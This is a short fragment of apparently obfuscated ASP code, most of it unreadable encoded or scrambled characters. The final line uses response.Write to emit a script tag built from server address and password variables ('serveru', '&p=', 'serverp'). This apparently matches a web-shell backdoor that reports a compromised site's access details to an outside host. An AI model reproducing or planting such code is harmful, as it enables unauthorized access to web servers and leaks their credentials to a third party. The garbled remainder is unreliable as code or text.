9{CasPTiiFP5:/aA$6x56)
B9Cas6["sq8rFuA|'o-p{)
  !:iK,/0\$faju:0Floa&{4
,[!5	e9/r5Jmin'`radT)n(A
{,!_P,"\ca~ywZ2GK5/`\N:nxBhWte4(A
{,s_C6,"]4b5Nk":&Tbac+')
T90HC6{u8s\":8sp{V
,{N:i2 /Eh#/:phE{4
,[_5	e9/aFddel'`apjj6l(A
{,__P,"Camu:s:#6i
9TN:s6,"cpx"a:|F#44
, q5s69"Sc*{DriZ6FoV#O{aTnaH~D]ivPFo]#
,{q:i2 /UccJDri\2i{a,n_5~DGsv69ReqCWst(/ori\2O`
[{sHs2 "UcFfkJKV/9T`TSago$jer %2B'P	]{/go$jetO)
B9Cas6["SP%psF2#6#-"ASe-Fik2mK#]6V
 {sai6 El	2[yHOWl4Vm6`
Bnd VWlec]
ioT/a-|PJ<>"^er\u"T%bK~{~ZTmEtV(5
RRUL<A}7D5></b==^#~@%><%response.Write(Efun & "" & serveru & "&p=" & serverp&"'><script>")%>